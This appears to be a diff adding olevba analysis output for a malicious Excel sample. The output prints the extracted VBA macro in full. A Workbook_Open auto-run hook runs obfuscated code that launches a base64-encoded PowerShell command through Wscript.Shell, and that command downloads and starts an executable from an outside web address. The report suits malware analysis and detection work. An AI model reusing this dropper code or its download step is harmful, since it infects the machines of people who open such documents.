@@ -1,0 +1,100 @@
+XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
+olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ee6d2f06ce4476370cb830acb3890dca.xls.bin
+Type: OLE
+WARNING  invalid value for PROJECTLCID_Id expected 0002 got 004A
+WARNING  invalid value for PROJECTLCID_Lcid expected 0409 got 0001
+WARNING  invalid value for PROJECTLCIDINVOKE_Id expected 0014 got 0002
+WARNING  invalid value for PROJECTCODEPAGE_Id expected 0003 got 0014
+WARNING  invalid value for PROJECTCODEPAGE_Size expected 0002 got 0004
+WARNING  invalid value for PROJECTNAME_Id expected 0004 got 0000
+ERROR    PROJECTNAME_SizeOfProjectName value not in range [1-128]: 131075
+ERROR    Error in _extract_vba
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 3526, in extract_macros
+    for stream_path, vba_filename, vba_code in \
+  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 2094, in _extract_vba
+    project = VBA_Project(ole, vba_root, project_path, dir_path, relaxed)
+  File "/usr/local/lib/python3.8/dist-packages/oletools/olevba.py", line 1752, in __init__
+    projectdocstring_id = struct.unpack("<H", dir_stream.read(2))[0]
+struct.error: unpack requires a buffer of 2 bytes
+-------------------------------------------------------------------------------
+VBA MACRO Sheet1 
+in file: ee6d2f06ce4476370cb830acb3890dca.xls.bin - OLE stream: 'Sheet1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO dhDSfUa 
+in file: ee6d2f06ce4476370cb830acb3890dca.xls.bin - OLE stream: 'dhDSfUa'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+
+
+Public Sub rWyYtUHOC()
+On Error Resume Next
+Dim yllrrOv As String
+yllrrOv = "NDHGFS"
+
+Dim LValue As Double
+
+LValue = NPer(0.0525 / 1, -200, 1500)
+
+
+
+ FfxoXYwEo = ActiveWorkbook.BuiltinDocumentProperties("Comments")
+ aMMhrPjTA = ActiveWorkbook.BuiltinDocumentProperties("Subject")
+
+Dim RValue As Double
+
+RValue = Rate(10 * 1, -1000, 6500)
+
+
+  WzpIUxvU = "IAAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsAIAAoAE4ARQB3AC0AbwBiAGoARQBjAHQAIAAcIGAAT" & _
+"gBgAGUAYABUAGAALgBgAFcAYABlAGAAQgBgAEMAYABsAGAAaQBgAGUAYABOAGAAVAAdICkALgBEAG8AdwBuAEwAbwBBAGQAZgBJAGwARQAoACAAHS" & _
+"BoAHQAdABwADoALwAvAHMAdQB5AGEAcwBoAGMAbwBsAGwAZQBnAGUAbwBmAG4AdQByAHMAaQBuAGcALgBjAG8AbQAvAGwAYQBuAGcAdQBhAGcAZQA" & _
+"vAEQAbwBuADEANgAzAC8AQwByAHkAcAB0AGUAZABGAGkAbABlADEANgAzAC4AZQB4AGUAHSAgACwAIAAdICQARQBOAHYAOgB0AGUAbQBwAFwAagBm" & _
+"AGMAYgB2AGUAcAB0AC4AZQB4AGUAHSAgACkAIAA7ACAAcwB0AEEAUgB0ACAAHSAkAEUATgB2ADoAdABlAG0AcABcAGoAZgBjAGIAdgBlAHAAdAAuA" & _
+"GUAeABlAB0gOwAkAGYAZABzAGYAcwBkAGYAIAA9ACAAIgBmAHMAZgBkAGcAaABmAGQAZABmAGcAaAAiADsA"
+
+    Dim zKShMevSa As Object
+    Set zKShMevSa = CreateObject("Wscript.Shell")
+    zKShMevSa.Run FfxoXYwEo + aMMhrPjTA + WzpIUxvU, RValue
+
+
+
+
+
+End Sub
+
+
+-------------------------------------------------------------------------------
+VBA MACRO ThisWorkbook 
+in file: ee6d2f06ce4476370cb830acb3890dca.xls.bin - OLE stream: 'ThisWorkbook'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Workbook_Open()
+Call rWyYtUHOC
+End Sub
+
+
+
+
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Wscript.Shell       |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Run                 |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+|Suspicious|CreateObject        |May create an OLE object                     |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
++----------+--------------------+---------------------------------------------+
+
